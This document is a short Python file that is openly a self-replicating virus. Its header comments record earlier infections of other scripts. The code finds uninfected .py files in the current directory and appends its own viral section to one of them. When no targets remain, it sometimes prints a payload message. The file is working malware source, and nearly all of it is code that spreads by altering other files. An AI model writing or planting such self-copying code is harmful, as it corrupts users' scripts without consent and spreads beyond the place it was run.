## "#@! infected by virus !@#"
#C:\Users\Daniel\Virus - Do Not Eat\one.py infected three.py
#C:\Users\Daniel\Virus - Do Not Eat\motterVirus.py infected one.py

import os
import random

def infected(filename):
    f = open(filename, 'r')
    infected = '## "#@! infected by virus !@#"' in f.read()
    f.close()
    return infected

def selectTarget():
    files = os.listdir(os.getcwd())
    eligibleTargets = [file for file in files if file.endswith('.py') and not infected(file)]
    if eligibleTargets:
        return random.choice(eligibleTargets)
    else:
        return False

def copyCode(filename):
    viralCode = ''
    partOfViralCode = False
    with open(__file__, 'r') as this:
        for line in this:
            if partOfViralCode:
                viralCode += line
            if not partOfViralCode and line == '## "#@! infected by virus !@#"\n':
                viralCode = line + '#' + __file__ + ' infected ' + filename + '\n'
                partOfViralCode = True         
    this.close()
    target = open(filename, 'a')
    target.write(viralCode) 
    target.close()

def payload():
    print('VIRUS PAYLOAD DELIVERED!')

def infect():
    target = selectTarget()
    if target:
        copyCode(target)
    else:
        if random.randrange(1,5) == 1:
            payload()

infect()
